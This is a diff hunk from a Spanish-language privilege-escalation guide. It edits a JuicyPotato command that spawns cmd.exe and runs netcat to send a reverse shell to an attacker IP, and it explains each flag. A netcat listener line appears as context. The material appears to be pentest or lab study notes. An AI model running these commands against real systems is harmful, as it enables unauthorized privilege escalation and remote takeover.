@@ -1794,14 +1794,14 @@ rlwrap nc -lnvp 4444
 2. **Ejecutar JuicyPotato en la máquina objetivo**:
 
 ```bash
-c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
+c:\temp\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\temp\nc.exe 192.168.56.5 4444 -e cmd.exe" -t *
 ```
 
 Explicación:
 
 - `-l`: Especifica el puerto de escucha del servidor COM (53375 en este caso).
 - `-p`: Programa a lanzar (en este caso, cmd.exe).
-- `-a`: Argumento pasado a cmd.exe. Aquí, le indica a Netcat que se conecte a la máquina del atacante y proporcione una reverse shell.
+- `-a`: Argumento pasado a cmd.exe. Aquí, le indica a Netcat que se conecte a la máquina atacante y proporcione una reverse shell.
 - `-t`: Especifica el `createprocess` a llamar, utilizando las funciones `CreateProcessWithTokenW` o `CreateProcessAsUser`, que requieren privilegios **SeImpersonate** o **SeAssignPrimaryToken**.
 
 ###### PrintSpoofer
